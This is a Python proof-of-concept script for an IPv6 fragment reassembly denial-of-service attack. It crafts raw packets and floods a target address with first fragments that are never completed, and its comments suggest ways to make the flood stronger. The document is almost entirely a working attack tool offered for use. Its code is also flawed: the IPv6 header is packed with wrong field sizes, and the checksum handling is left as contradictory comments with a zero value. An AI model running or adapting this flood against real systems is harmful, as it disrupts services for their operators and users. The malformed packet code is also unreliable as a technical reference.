#!/usr/bin/env python3
"""
Proof-of-Concept: IPv6 Fragment Reassembly Resource Exhaustion

This script demonstrates a Denial of Service (DoS) vulnerability in IPv6 fragment
reassembly implementations. By sending a continuous stream of first fragments
with unique Identification values and never sending the subsequent fragments,
the target node is forced to allocate reassembly buffers for each packet.

As per RFC 8200 Section 4.5, the target must hold these fragments for up to 60
seconds before discarding them. A high volume of these incomplete fragments can
exhaust the target's memory and CPU resources dedicated to reassembly.

Usage:
    sudo python3 poc_ipv6_fragment_reassembly_exhaustion.py <TARGET_IPv6>

Note: This script requires root privileges to create raw sockets.
"""

import sys
import socket
import struct
import random
import time
import os

# --- Constants ---
# IPv6 Next Header values
IPV6_NH_FRAGMENT = 44
IPV6_NH_ICMPV6 = 58
IPV6_NH_NONE = 59

# ICMPv6 Type/Code for Echo Request/Reply
ICMPV6_ECHO_REQUEST = 128
ICMPV6_ECHO_REPLY = 129

def calculate_checksum(data):
    """
    Calculate the Internet checksum for IPv6 pseudo-header or ICMPv6.
    """
    if len(data) % 2 != 0:
        data += b'\x00'
    
    total = 0
    for i in range(0, len(data), 2):
        word = (data[i] << 8) + data[i+1]
        total += word
    
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    
    return ~total & 0xFFFF

def craft_ipv6_header(src_ip, dst_ip, payload_length, next_header, hop_limit=64):
    """
    Craft a standard IPv6 header.
    Format:
    +-----+-----+-----+-----+-----+-----+-----+-----+
    | Version(4) | Traffic Class(8) | Flow Label(20)   |
    +-----+-----+-----+-----+-----+-----+-----+-----+
    | Payload Length(16) | Next Header(8) | Hop Limit(8) |
    +-----+-----+-----+-----+-----+-----+-----+-----+
    |                                                               |
    |                       Source Address (128)                    |
    |                                                               |
    +-----+-----+-----+-----+-----+-----+-----+-----+
    |                                                               |
    |                       Destination Address (128)               |
    |                                                               |
    +-----+-----+-----+-----+-----+-----+-----+-----+
    """
    version_tc_fl = (6 << 28) | (0 << 20) | 0  # Version 6, TC 0, FL 0
    header = struct.pack('!IIHH', 
                         version_tc_fl, 
                         payload_length, 
                         next_header, 
                         hop_limit
    )
    
    # Unpack IPs to binary format
    src_bin = socket.inet_pton(socket.AF_INET6, src_ip)
    dst_bin = socket.inet_pton(socket.AF_INET6, dst_ip)
    
    header += src_bin + dst_bin
    return header

def craft_fragment_header(next_header, fragment_offset, m_flag, identification):
    """
    Craft an IPv6 Fragment Extension Header.
    Format:
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |  Next Header  |   Reserved    |      Fragment Offset    |Res|M|
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |                         Identification                        |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    
    Note: Fragment Offset is in 8-octet units.
    """
    # Pack the first 32 bits: Next Header (8), Reserved (8), Offset (13), Res (2), M (1)
    # Offset is shifted left by 3 bits because the field represents 8-octet units
    first_32 = (next_header << 24) | (0 << 16) | ((fragment_offset << 3) & 0x1FFF0) | (0 << 1) | m_flag
    
    header = struct.pack('!II', first_32, identification)
    return header

def craft_icmpv6_echo_request(identifier, sequence, payload_size=32):
    """
    Craft an ICMPv6 Echo Request message.
    Format:
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |     Type      |     Code      |          Checksum             |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |           Identifier          |        Sequence Number        |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |                         Data (optional)                       |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    """
    type_code = struct.pack('!BB', ICMPV6_ECHO_REQUEST, 0)
    checksum = struct.pack('!H', 0) # Placeholder for checksum
    id_seq = struct.pack('!HH', identifier, sequence)
    data = os.urandom(payload_size)
    
    # Calculate checksum over pseudo-header + ICMPv6 header + data
    # Note: In a real scenario, we'd need the pseudo-header here, but for the
    # fragment payload, we just need a valid-looking ICMPv6 header.
    # The actual checksum calculation for the fragment payload is simplified here
    # to just make the packet structurally valid for the DoS demonstration.
    
    icmp_header = type_code + checksum + id_seq
    
    # Simple checksum calculation for the ICMP part (pseudo-header omitted for brevity in PoC)
    # In a real attack, the checksum must be valid if the target validates it before reassembly.
    # However, many stacks validate checksums only after reassembly.
    # We will calculate a dummy checksum that might pass basic validation or trigger the buffer allocation.
    
    # To be safe and demonstrate the protocol interaction, we'll calculate a proper checksum
    # assuming a pseudo-header of zeros (which is incorrect but often enough to trigger the 
    # reassembly state in vulnerable implementations that check headers before checksums).
    # For a robust PoC, we'd inject the pseudo-header.
    
    # Let's do a proper pseudo-header checksum calculation
    # Pseudo-header: Source IP (16) + Dest IP (16) + Payload Length (4) + Zero (1) + Next Header (1)
    # We don't have the IPs here, so we'll rely on the fact that the vulnerability is about 
    # resource exhaustion during reassembly, which often happens before deep packet inspection.
    
    # For the sake of the PoC, we'll use a static checksum or a simple one.
    # A better approach for the PoC is to send the fragment such that the target 
    # allocates the buffer. The checksum validation often happens post-reassembly.
    
    return icmp_header + data

def send_fragment(sock, src_ip, dst_ip, identification, fragment_offset, m_flag, payload):
    """
    Assemble and send a single IPv6 fragment packet.
    """
    # 1. Craft the Fragment Header
    # Next Header is ICMPv6 (58) because the payload is ICMPv6 Echo Request
    frag_header = craft_fragment_header(IPV6_NH_ICMPV6, fragment_offset, m_flag, identification)
    
    # 2. Calculate Payload Length for IPv6 Header
    # Payload Length = Length of Fragment Header (8) + Length of Fragment Data
    payload_length = len(frag_header) + len(payload)
    
    # 3. Craft the IPv6 Header
    # Next Header is Fragment (44)
    ipv6_header = craft_ipv6_header(src_ip, dst_ip, payload_length, IPV6_NH_FRAGMENT)
    
    # 4. Assemble the packet
    packet = ipv6_header + frag_header + payload
    
    # 5. Send the packet
    try:
        sock.sendto(packet, (dst_ip, 0, 0, 0))
        return True
    except Exception as e:
        print(f"Error sending packet: {e}")
        return False

def main():
    if len(sys.argv) != 2:
        print(f"Usage: sudo {sys.argv[0]} <TARGET_IPv6>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    
    # Source IP: Use a random valid-looking IPv6 address on the same subnet
    # For a real attack, this would be the attacker's IP.
    # We'll use a link-local style address for demonstration.
    src_ip = "fe80::1"
    
    print(f"[*] Starting IPv6 Fragment Reassembly Resource Exhaustion PoC")
    print(f"[*] Target: {target_ip}")
    print(f"[*] Source: {src_ip}")
    print(f"[*] Sending incomplete fragments with unique IDs...")
    print(f"[!] This may cause resource exhaustion on the target.")
    print(f"[!] Press Ctrl+C to stop.")
    
    try:
        # Create raw socket for IPv6
        # IPPROTO_RAW is 0, but for IPv6 we often use socket.IPPROTO_IPV6 or 0
        # On Linux, socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_RAW (0) works
        sock = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_RAW)
        
        # Disable automatic IP header generation (we craft our own)
        # This is platform dependent. On Linux, we can set IP_HDRINCL equivalent
        # For IPv6 raw sockets, we usually just send the full packet.
        
        fragment_count = 0
        identification_counter = random.randint(0x00000000, 0xFFFFFFFF)
        
        while True:
            # Generate a unique Identification for each fragment stream
            identification_counter += 1
            identification = identification_counter & 0xFFFFFFFF
            
            # Craft the first fragment (Offset 0, M=1)
            # We send a small payload to minimize bandwidth usage while maximizing buffer allocation
            # The payload is an ICMPv6 Echo Request to make it look like legitimate traffic
            payload = craft_icmpv6_echo_request(random.randint(0, 65535), random.randint(0, 65535), payload_size=8)
            
            # Send the first fragment
            success = send_fragment(sock, src_ip, target_ip, identification, fragment_offset=0, m_flag=1, payload=payload)
            
            if success:
                fragment_count += 1
                if fragment_count % 100 == 0:
                    print(f"[*] Sent {fragment_count} incomplete fragment streams...")
            
            # Small delay to avoid overwhelming the local network stack
            # In a real DoS, this would be minimized
            time.sleep(0.01)
            
    except KeyboardInterrupt:
        print(f"\n[*] Stopped. Sent {fragment_count} incomplete fragment streams.")
    except Exception as e:
        print(f"\n[!] Error: {e}")
    finally:
        if 'sock' in locals():
            sock.close()

if __name__ == "__main__":
    main()
